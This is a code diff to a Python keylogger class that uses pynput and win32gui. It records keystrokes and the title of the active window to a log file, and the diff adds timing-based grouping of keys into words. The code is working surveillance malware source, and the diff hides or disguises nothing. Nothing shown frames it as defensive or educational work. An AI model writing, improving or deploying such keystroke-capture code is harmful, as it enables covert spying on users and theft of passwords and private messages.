@@ -1,7 +1,7 @@
 from pynput.keyboard import Key, Listener
-
+import time
 import logging
-
+import pynput
 from win32gui import GetWindowText, GetForegroundWindow
 
 logging.basicConfig(filename='YoYo.log', filemode='w', level=logging.INFO)
@@ -12,6 +12,8 @@ keys=[]
 
 class keylogger():
     def __init__(self):
+        self.word=""
+        self.laststroke=time.time()
         global logger
         self.lastApp,self.lastactivewindow = self.getActiveWindow()
         logger.info(self.lastactivewindow)
@@ -36,13 +38,32 @@ class keylogger():
             logger.info("-"*50)
             self.lastactivewindow=self.currentactivewindow
 
+    def ischaracter(self,key):
+        try:
+            if isinstance(key,pynput.keyboard._win32.KeyCode) and (ord(str(key)[1]) in range(32,126)):
+                return True
+        except:
+            return False
     
     def on_press(self,key):
+        stroketime=time.time()
         global keys,count,logger
         self.currentApp,self.currentactivewindow=self.getActiveWindow()
         self.checkCurrentWindow()
         
-        logger.info("{0}pressed".format(key)) 
+        print(stroketime-self.laststroke,"{0}".format(key)[1])
+        if stroketime-self.laststroke>1:
+            print()
+            logger.info(self.word)
+            if self.ischaracter(key):
+                self.word="{0}".format(key)[1]
+            else:
+                self.word=""
+        if self.ischaracter(key):
+            self.word+="{0}".format(key)[1]
+   
+        self.laststroke=stroketime 
+
 
     def write_file(self,keys):
         with open("log.txt", "a") as f:
